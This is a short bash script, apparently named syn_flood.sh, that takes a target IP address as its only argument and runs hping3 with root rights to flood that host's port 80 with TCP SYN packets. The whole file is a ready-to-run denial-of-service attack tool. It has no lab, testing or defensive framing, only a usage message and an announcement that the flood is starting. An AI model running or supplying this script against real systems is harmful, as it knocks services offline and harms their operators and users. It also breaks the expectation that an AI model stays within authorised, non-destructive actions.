#!/bin/bash

TARGET_IP=$1

if [ -z "$TARGET_IP" ]; then
  echo "Usage: ./syn_flood.sh <target_ip>"
  exit 1
fi

echo "Starting SYN flood on $TARGET_IP"
sudo hping3 -S --flood -p 80 $TARGET_IP
